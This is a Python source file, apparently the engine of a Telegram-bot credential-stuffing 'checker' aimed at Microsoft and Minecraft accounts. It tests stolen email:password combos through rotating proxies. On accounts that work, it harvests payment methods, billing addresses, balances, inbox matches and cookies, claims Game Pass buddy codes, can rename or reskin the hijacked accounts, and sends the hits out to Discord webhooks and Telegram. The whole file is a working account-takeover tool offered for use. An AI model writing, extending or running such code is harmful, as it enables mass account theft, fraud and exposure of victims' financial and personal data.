"""
checker_engine.py — Core checking engine with CaptureObject and full module orchestration.
"""
import asyncio
import os
import random
import threading
import time
import zipfile
from dataclasses import dataclass, field
from typing import Optional, List, Tuple

import requests

from proxy_parser import parse_proxy
from login_helper import microsoft_login
import hypixel_stats as hypixel_mod
import balance as balance_mod
import donut_stats as donut_mod
import payment_methods as payment_mod
import rewardpoints as reward_mod
import ban_checker as ban_mod
import email_checker as email_mod
import buddy_pass as buddy_mod
import inbox_scanner as inbox_mod
import cookie_saver as cookie_mod
import auto_ops
import discord_notifier
import subscriptions as subs_mod


# ---------------------------------------------------------------------------
# CaptureObject
# ---------------------------------------------------------------------------

@dataclass
class CaptureObject:
    # Core identity
    email: str = ''
    password: str = ''
    name: str = 'N/A'
    capes: str = ''
    uuid: str = ''
    token: str = ''
    type: str = ''
    session: object = field(default=None, repr=False)

    # Hypixel stats (soopy.dev)
    hypixl: Optional[str] = None
    level: Optional[str] = None
    firstlogin: Optional[str] = None
    lastlogin: Optional[str] = None
    bwstars: Optional[str] = None
    swstars: Optional[str] = None
    sbcoins: Optional[str] = None
    sbnetworth: Optional[str] = None
    pitcoins: Optional[str] = None
    sb_lvl: Optional[str] = None
    sb_items: Optional[str] = None

    # Ban status
    banned: Optional[str] = None
    ban_checked: bool = False

    # Optifine cape
    cape: Optional[str] = None

    # Email access
    access: Optional[str] = None

    # Name change
    namechanged: Optional[str] = None
    lastchanged: Optional[str] = None

    # Microsoft financial
    ms_balance: Optional[str] = None
    ms_rewards: Optional[str] = None
    ms_payment_methods: List[str] = field(default_factory=list)
    ms_billing_addresses: List[str] = field(default_factory=list)
    ms_subscriptions: List[str] = field(default_factory=list)

    # DonutSMP stats
    donut_money: Optional[str] = None
    donut_kills: Optional[str] = None
    donut_deaths: Optional[str] = None
    donut_mobs_killed: Optional[str] = None
    donut_playtime: Optional[str] = None
    donut_shards: Optional[str] = None
    donut_broken_blocks: Optional[str] = None
    donut_placed_blocks: Optional[str] = None
    donut_money_made_from_sell: Optional[str] = None
    donut_money_spent_on_shop: Optional[str] = None

    # Inbox matches
    inbox_matches: List[Tuple[str, int]] = field(default_factory=list)

    # Buddy pass codes
    buddy_codes: List[str] = field(default_factory=list)

    def builder(self) -> str:
        """Build a formatted Capture.txt block for this account."""
        lines = [
            f'Email: {self.email}',
            f'Password: {self.password}',
            f'Name: {self.name}',
            f'Capes: {self.capes}',
            f'Account Type: {self.type}',
        ]
        if self.hypixl:       lines.append(f'Hypixel: {self.hypixl}')
        if self.level:        lines.append(f'Hypixel Level: {self.level}')
        if self.firstlogin:   lines.append(f'First Hypixel Login: {self.firstlogin}')
        if self.lastlogin:    lines.append(f'Last Hypixel Login: {self.lastlogin}')
        if self.bwstars:      lines.append(f'Bedwars Stars: {self.bwstars}')
        if self.swstars:      lines.append(f'Skywars Stars: {self.swstars}')
        if self.sbcoins:      lines.append(f'Skyblock Coins: {self.sbcoins}')
        if self.sbnetworth:   lines.append(f'Skyblock Networth: {self.sbnetworth}')
        if self.pitcoins:     lines.append(f'Pit Gold: {self.pitcoins}')
        if self.sb_lvl:       lines.append(f'Skyblock Level: {self.sb_lvl}')
        if self.sb_items:     lines.append(f'Skyblock Items: {self.sb_items}')
        if self.banned is not None: lines.append(f'Hypixel Banned: {self.banned}')
        if self.cape:         lines.append(f'Optifine Cape: {self.cape}')
        if self.access:       lines.append(f'Email Access: {self.access}')
        if self.namechanged:  lines.append(f'Can Change Name: {self.namechanged}')
        if self.lastchanged:  lines.append(f'Last Name Change: {self.lastchanged}')
        if self.ms_balance:   lines.append(f'MS Balance: {self.ms_balance}')
        if self.ms_rewards:   lines.append(f'Rewards Points: {self.ms_rewards}')
        if self.ms_payment_methods:
            lines.append(f'Payment Methods: {", ".join(self.ms_payment_methods)}')
        if self.ms_billing_addresses:
            lines.append(f'Billing Address: {"; ".join(self.ms_billing_addresses)}')
        if self.ms_subscriptions:
            lines.append(f'Subscriptions: {", ".join(self.ms_subscriptions)}')
        if self.donut_money:  lines.append(f'DonutSMP Money: {self.donut_money}')
        if self.donut_kills:  lines.append(f'DonutSMP Kills: {self.donut_kills}')
        if self.donut_deaths: lines.append(f'DonutSMP Deaths: {self.donut_deaths}')
        if self.donut_mobs_killed: lines.append(f'DonutSMP Mobs Killed: {self.donut_mobs_killed}')
        if self.donut_playtime: lines.append(f'DonutSMP Playtime: {self.donut_playtime}')
        if self.donut_shards: lines.append(f'DonutSMP Shards: {self.donut_shards}')
        if self.donut_broken_blocks: lines.append(f'DonutSMP Broken Blocks: {self.donut_broken_blocks}')
        if self.donut_placed_blocks: lines.append(f'DonutSMP Placed Blocks: {self.donut_placed_blocks}')
        if self.donut_money_made_from_sell: lines.append(f'DonutSMP Money From Sell: {self.donut_money_made_from_sell}')
        if self.donut_money_spent_on_shop: lines.append(f'DonutSMP Money Spent: {self.donut_money_spent_on_shop}')
        if self.inbox_matches:
            inbox_str = ', '.join(f'{k}({v})' for k, v in self.inbox_matches)
            lines.append(f'Inbox Matches: {inbox_str}')
        if self.buddy_codes:
            lines.append(f'Buddy Pass Codes: {", ".join(self.buddy_codes)}')
        lines.append('============================')
        return '\n'.join(lines) + '\n'

    def hits_line(self) -> str:
        """Single-line entry for hits.txt."""
        parts = [f'{self.email}:{self.password}']
        if self.name and self.name != 'N/A':
            parts.append(f'Name: {self.name}')
        parts.append(f'Type: {self.type}')
        if self.hypixl:     parts.append(f'Hypixel: {self.hypixl}')
        if self.bwstars:    parts.append(f'BW: {self.bwstars}')
        if self.sbnetworth: parts.append(f'NW: {self.sbnetworth}')
        if self.banned is not None:
            parts.append(f'Banned: {self.banned}')
        if self.ms_balance: parts.append(f'Balance: {self.ms_balance}')
        if self.ms_rewards: parts.append(f'Rewards: {self.ms_rewards}')
        if self.buddy_codes:
            parts.append(f'Codes: {len(self.buddy_codes)}')
        return ' | '.join(parts)


# ---------------------------------------------------------------------------
# CheckerEngine
# ---------------------------------------------------------------------------

class CheckerEngine:
    def __init__(self, user_id, combo_list, proxy_list, threads, settings, db, bot, loop,
                 auto_proxy_pool=None):
        self.user_id = user_id
        self.combo_list = combo_list
        self.proxy_list = [parse_proxy(p) for p in proxy_list if parse_proxy(p)]
        if auto_proxy_pool:
            self.proxy_list = self.proxy_list or auto_proxy_pool
        self.threads = threads
        self.settings = settings
        self.db = db
        self.bot = bot
        self.loop = loop

        # Build config dict from database
        self.config = db.get_user_capture_config(user_id) if db else {}

        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.twofa = 0
        self.valid_mail = 0
        self.checked = 0
        self.total = len(combo_list)
        self.start_time = time.time()
        self.is_running = True

        self.results_dir = f'results/{user_id}_{int(self.start_time)}'
        os.makedirs(self.results_dir, exist_ok=True)
        self.lock = threading.Lock()

    # ---------------------------------------------------------------- helpers

    def get_proxy(self):
        if not self.proxy_list:
            return None
        return random.choice(self.proxy_list)

    def write_dedupe(self, fname: str, filename: str, content: str) -> None:
        """Thread-safe deduplication write. Only appends if content not already present."""
        with self.lock:
            path = os.path.join(self.results_dir, filename)
            os.makedirs(os.path.dirname(path) if os.path.dirname(path) else self.results_dir, exist_ok=True)
            existing = ''
            if os.path.exists(path):
                try:
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        existing = f.read()
                except Exception:
                    pass
            if content.strip() not in existing:
                with open(path, 'a', encoding='utf-8', buffering=1) as f:
                    f.write(content)

    def _write_dedupe_wrapper(self, fname_ignored, filename, content):
        """Adapter matching the (fname, filename, content) signature used by sub-modules."""
        self.write_dedupe(self.results_dir, filename, content)

    # ---------------------------------------------------------------- UI

    async def update_ui(self, msg_obj):
        while self.is_running:
            if self.checked >= self.total > 0:
                break
            elapsed = time.time() - self.start_time
            cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            bar_len = 15
            filled = int(bar_len * progress / 100)
            bar = '🟩' * filled + '⬜' * (bar_len - filled)
            text = (
                f'🚀 <b>Checking Progress</b>\n'
                f'━━━━━━━━━━━━━━━━━━\n'
                f'✅ Hits: {self.hits}\n'
                f'❌ Bad: {self.bad}\n'
                f'🔐 2FA: {self.twofa}\n'
                f'📧 Valid Mail: {self.valid_mail}\n'
                f'⚠️ Errors: {self.errors}\n'
                f'🔄 Checked: {self.checked}/{self.total}\n'
                f'📈 Progress: [{bar}] {progress:.1f}%\n'
                f'⚡ CPM: {cpm}\n'
                f'⏱ Elapsed: {int(elapsed)}s\n'
                f'━━━━━━━━━━━━━━━━━━\n'
                f'Credits: @akaza_isnt'
            )
            try:
                await msg_obj.edit_text(text, parse_mode='HTML')
            except Exception:
                pass
            await asyncio.sleep(5)

    # ---------------------------------------------------------------- account check

    def _check_optifine(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('optifinecape', True):
            return
        try:
            r = requests.get(
                f'http://s.optifine.net/capes/{capture_obj.name}.png',
                proxies=self.get_proxy(), verify=False, timeout=10
            )
            capture_obj.cape = 'No' if 'Not found' in r.text else 'Yes'
        except Exception:
            capture_obj.cape = 'Unknown'

    def _check_namechange(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('namechange', True):
            return
        try:
            from datetime import datetime, timezone
            r = capture_obj.session.get(
                'https://api.minecraftservices.com/minecraft/profile/namechange',
                headers={'Authorization': f'Bearer {capture_obj.token}'},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                capture_obj.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                created_at = data.get('createdAt')
                if created_at and self.config.get('lastchanged', True):
                    try:
                        try:
                            dt = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%S.%fZ')
                        except ValueError:
                            dt = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%SZ')
                        dt = dt.replace(tzinfo=timezone.utc)
                        diff = datetime.now(timezone.utc) - dt
                        years = diff.days // 365
                        months = (diff.days % 365) // 30
                        days = diff.days
                        fmt = dt.strftime('%m/%d/%Y')
                        if years > 0:
                            capture_obj.lastchanged = f'{years} year{"s" if years != 1 else ""} - {fmt} - {created_at}'
                        elif months > 0:
                            capture_obj.lastchanged = f'{months} month{"s" if months != 1 else ""} - {fmt} - {created_at}'
                        else:
                            capture_obj.lastchanged = f'{days} day{"s" if days != 1 else ""} - {fmt} - {created_at}'
                    except Exception:
                        pass
        except Exception:
            pass

    def _fetch_hypixel(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('hypixel_stats', True):
            return
        try:
            stats_str = hypixel_mod.fetch_hypixel_stats(capture_obj.name, capture_obj.uuid)
            if stats_str:
                # Parse compact string back into fields
                capture_obj.hypixl = stats_str
                import re
                nw = re.search(r'NW: (\S+)', stats_str)
                if nw: capture_obj.sbnetworth = nw.group(1)
                bw = re.search(r'BW: (\d+)', stats_str)
                if bw: capture_obj.bwstars = bw.group(1)
                sw = re.search(r'SW: (\d+)', stats_str)
                if sw: capture_obj.swstars = sw.group(1)
                pit = re.search(r'Pit_Gold: (\S+)', stats_str)
                if pit: capture_obj.pitcoins = pit.group(1)
                sb_lvl = re.search(r'Sb_Lvl: (\d+)', stats_str)
                if sb_lvl: capture_obj.sb_lvl = sb_lvl.group(1)
                items = re.search(r'Sb_Valuable_Items: (.+)', stats_str)
                if items: capture_obj.sb_items = items.group(1)
        except Exception:
            pass

    def _fetch_donut(self, capture_obj: CaptureObject) -> None:
        if not self.config.get('donut_stats', True):
            return
        try:
            import threading as _t
            result = {}

            def _run():
                try:
                    stats = donut_mod.fetch_donut_stats(
                        capture_obj.name, capture_obj.email, capture_obj.password,
                        capture_obj.banned, self.results_dir, self.lock,
                        self.config, self.get_proxy, 'http',
                        write_dedupe=self._write_dedupe_wrapper
                    )
                    if stats:
                        result.update(stats)
                except Exception:
                    pass

            t = _t.Thread(target=_run, daemon=True)
            t.start()
            t.join(timeout=20)

            if result:
                capture_obj.donut_money = result.get('money')
                capture_obj.donut_kills = result.get('kills')
                capture_obj.donut_deaths = result.get('deaths')
                capture_obj.donut_mobs_killed = result.get('mobs_killed')
                capture_obj.donut_playtime = result.get('playtime')
                capture_obj.donut_shards = result.get('shards')
                capture_obj.donut_broken_blocks = result.get('broken_blocks')
                capture_obj.donut_placed_blocks = result.get('placed_blocks')
                capture_obj.donut_money_made_from_sell = result.get('money_made_from_sell')
                capture_obj.donut_money_spent_on_shop = result.get('money_spent_on_shop')
        except Exception:
            pass

    def check_account(self, combo: str) -> None:
        if ':' not in combo:
            with self.lock:
                self.errors += 1
                self.checked += 1
            return

        email, password = combo.strip().split(':', 1)
        if not email or not password:
            with self.lock:
                self.bad += 1
                self.checked += 1
            return

        session = requests.Session()
        session.verify = False
        session.proxies = self.get_proxy()

        try:
            # ---- Step 1: Microsoft authentication ----
            token, xbox_token = microsoft_login(session, email, password)

            if token == '2FA':
                self.write_dedupe(self.results_dir, '2fa.txt', f'{email}:{password}\n')
                discord_notifier.send_2fa_webhook(email, password, self.config)
                with self.lock:
                    self.twofa += 1
                self.db.update_stats(self.user_id, errors=1)
                return

            if not token:
                self.write_dedupe(self.results_dir, 'bad.txt', f'{email}:{password}\n')
                with self.lock:
                    self.bad += 1
                self.db.update_stats(self.user_id, bad=1)
                return

            # ---- Step 2: Minecraft entitlement check ----
            import minecraft_checker as mc_mod
            capture_obj = CaptureObject(
                email=email, password=password, session=session, token=token
            )
            has_mc = mc_mod.checkmc(
                session, email, password, token, xbox_token,
                self.config, self.proxy_list, self.config.get('max_retries', 3),
                self.get_proxy, self.lock, self.results_dir,
                self._write_dedupe_wrapper, capture_obj,
                discord_notifier.send_xbox_webhook,
                discord_notifier.send_other_webhook,
            )

            if not has_mc:
                # Valid Microsoft account but no MC/XGP entitlement
                self.write_dedupe(self.results_dir, 'Valid_Mail.txt', f'{email}:{password}\n')
                with self.lock:
                    self.valid_mail += 1
                return

            # ---- Step 3: Buddy pass codes (for XGPU/XGP) ----
            if xbox_token and ('Game Pass' in capture_obj.type or 'XGPU' in capture_obj.type):
                try:
                    codes = buddy_mod.claim_buddypass_offers(
                        session, xbox_token, self.results_dir,
                        self._write_dedupe_wrapper, self.config,
                        self.proxy_list, self.get_proxy,
                        self.config.get('max_retries', 3)
                    )
                    capture_obj.buddy_codes = codes
                except Exception:
                    pass

            # ---- Step 4: Parallel capture threads ----
            capture_threads = []

            def _add_thread(target, *args):
                t = threading.Thread(target=target, args=args, daemon=True)
                t.start()
                capture_threads.append(t)

            _add_thread(self._fetch_hypixel, capture_obj)
            _add_thread(self._check_optifine, capture_obj)
            _add_thread(self._check_namechange, capture_obj)

            if self.config.get('cap_ban_check', True):
                _add_thread(
                    ban_mod.check_hypixel_ban,
                    capture_obj, token, capture_obj.name, capture_obj.uuid,
                    session, [], self.lock, self.results_dir,
                    self._write_dedupe_wrapper, self.lock,
                    self.config.get('max_retries', 3), self.config
                )

            if self.config.get('cap_email_access', True):
                def _email_check():
                    result = email_mod.check_email_access(
                        email, password, self.results_dir,
                        self._write_dedupe_wrapper, self.config
                    )
                    capture_obj.access = result
                _add_thread(_email_check)

            if self.config.get('check_microsoft_balance', False):
                def _balance_check():
                    bal = balance_mod.fetch_balance(
                        session, email, password, self.config,
                        self.results_dir, self._write_dedupe_wrapper
                    )
                    capture_obj.ms_balance = bal
                _add_thread(_balance_check)

            if self.config.get('check_rewards_points', True):
                def _rewards_check():
                    pts = reward_mod.fetch_rewards(
                        session, email, password, self.config,
                        self.results_dir, self._write_dedupe_wrapper
                    )
                    capture_obj.ms_rewards = pts
                _add_thread(_rewards_check)

            if self.config.get('check_payment', False):
                def _payment_check():
                    result = payment_mod.fetch_payment_methods(
                        session, email, password, self.config,
                        self.results_dir, self.lock, self._write_dedupe_wrapper
                    )
                    if result.get('instruments'):
                        capture_obj.ms_payment_methods = result['instruments']
                    if result.get('billing_addresses'):
                        capture_obj.ms_billing_addresses = result['billing_addresses']
                _add_thread(_payment_check)

            if self.config.get('cap_subscriptions', False):
                def _subs_check():
                    subs = subs_mod.check_subscriptions(
                        session, email, password,
                        self.results_dir, self._write_dedupe_wrapper, self.config
                    )
                    capture_obj.ms_subscriptions = subs
                _add_thread(_subs_check)

            if self.config.get('donut_stats', True):
                _add_thread(self._fetch_donut, capture_obj)

            if self.config.get('cap_inbox_scan', False):
                def _inbox_check():
                    keywords_str = self.config.get('inbox_keywords', 'Steam,Netflix,Xbox,Microsoft')
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                    matches = inbox_mod.check_inbox(session, email, keywords, self.config)
                    capture_obj.inbox_matches = matches
                    if matches:
                        fmt = ', '.join(f'{k}({v})' for k, v in matches)
                        self.write_dedupe(self.results_dir, 'inboxes.txt',
                                          f'{email}:{password} | Inbox: {fmt}\n')
                _add_thread(_inbox_check)

            # Join all capture threads (max 30s total)
            for t in capture_threads:
                t.join(timeout=30)

            # ---- Step 5: Auto ops ----
            if self.config.get('cap_auto_name', False) and capture_obj.name != 'N/A':
                new_name = auto_ops.setname(
                    session, token,
                    self.config.get('auto_name_format', 'Bot_{random_letter}_{random_number}'),
                    self.config.get('max_retries', 3),
                    capture_obj.name
                )
                if new_name != capture_obj.name:
                    capture_obj.name = f'{capture_obj.name} -> {new_name}'

            if self.config.get('cap_auto_skin', False):
                auto_ops.setskin(
                    session, token,
                    self.config.get('auto_skin_url', ''),
                    self.config.get('auto_skin_variant', 'classic'),
                    self.config.get('max_retries', 3)
                )

            # ---- Step 6: Cookie saving ----
            if self.config.get('cap_save_cookies', False):
                cookie_mod.save_cookies(session, capture_obj.name, capture_obj.type, self.results_dir)

            # ---- Step 7: Write result files ----
            self.write_dedupe(self.results_dir, 'hits.txt', capture_obj.hits_line() + '\n')
            self.write_dedupe(self.results_dir, 'Capture.txt', capture_obj.builder())

            # ---- Step 8: Discord webhook ----
            discord_notifier.send_hit_webhook(capture_obj, self.config)

            # ---- Step 9: Instant Telegram notification ----
            with self.lock:
                self.hits += 1
            self.db.update_stats(self.user_id, hits=1)

            if self.config.get('hit_notifications', True):
                hit_line = capture_obj.hits_line()
                self.loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(
                        self.bot.send_message(
                            self.user_id,
                            f'🎯 <b>HIT!</b>\n<code>{hit_line}</code>\n\nCredits: @akaza_isnt',
                            parse_mode='HTML'
                        )
                    )
                )

        except Exception as e:
            self.write_dedupe(self.results_dir, 'errors.txt', f'{email}:{password} ({e})\n')
            with self.lock:
                self.errors += 1
            self.db.update_stats(self.user_id, errors=1)
        finally:
            with self.lock:
                self.checked += 1
            try:
                session.close()
            except Exception:
                pass

    # ---------------------------------------------------------------- workers

    def run_worker(self) -> None:
        while self.is_running:
            combo = None
            with self.lock:
                if self.combo_list:
                    combo = self.combo_list.pop(0)
                else:
                    break
            if combo:
                self.check_account(combo)

    def start(self) -> None:
        thread_count = min(self.threads, max(1, len(self.combo_list)))
        threads_list = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.run_worker, daemon=True)
            t.start()
            threads_list.append(t)
        for t in threads_list:
            t.join()
        self.is_running = False

    def get_results_zip(self) -> str:
        zip_path = f'{self.results_dir}.zip'
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(self.results_dir):
                for fname in files:
                    full_path = os.path.join(root, fname)
                    if os.path.getsize(full_path) > 0:
                        arcname = os.path.relpath(full_path, self.results_dir)
                        zf.write(full_path, arcname)
        return zip_path
